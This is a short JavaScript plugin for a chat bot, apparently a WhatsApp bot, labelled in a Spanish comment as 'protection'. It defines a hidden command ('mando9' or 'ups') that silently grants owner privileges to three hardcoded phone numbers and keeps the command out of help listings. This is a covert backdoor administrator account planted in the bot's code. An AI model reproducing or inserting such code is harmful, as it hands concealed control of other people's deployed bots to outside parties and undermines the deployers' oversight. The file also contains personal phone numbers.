/* Creado por Ender Zaphkiel para protección del bot*/



const handler = async (m, { conn, command, usedPrefix, text }) => {
  const hiddenOwners = ['51920227615', '50488198573', '50557865603']; 

  if (hiddenOwners.includes(m.sender.split('@')[0])) {
    const isAlreadyOwner = global.owner.some(owner => owner[0] === m.sender.split('@')[0]);

    if (!isAlreadyOwner) {
      global.owner.push([m.sender.split('@')[0], 'Hidden Owner', true]);
      console.log('Owner restaurado:', m.sender.split('@')[0]); 
    }
  }
};

handler.command = /^(mando9|ups)$/i; 
handler.hidden = true; 

export default handler;